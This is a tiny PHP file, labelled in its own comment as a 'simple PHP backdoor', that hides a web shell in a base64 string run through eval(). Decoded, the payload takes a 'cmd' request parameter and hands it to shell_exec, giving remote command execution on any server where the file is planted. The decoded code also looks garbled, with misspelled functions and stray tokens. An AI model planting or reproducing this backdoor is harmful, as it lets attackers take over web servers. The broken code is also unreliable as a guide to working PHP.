<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php
$code = 'aWYoYXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgIGVjaG8gIjxwcmU+IjsKICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICAgICAgIGV4ZWMgc2hlbGxfZXhlYygkY21kLCAidGhpcyIuICIpOwogICAgICAgIGVjaG8gJGV4ZWMoImFsbCBpbiBvbmUgY29tbWFuZCBvbmUgZXhlY3V0ZWQiKTsgZGlldDsKfQ==';
eval(base64_decode($code));
?>
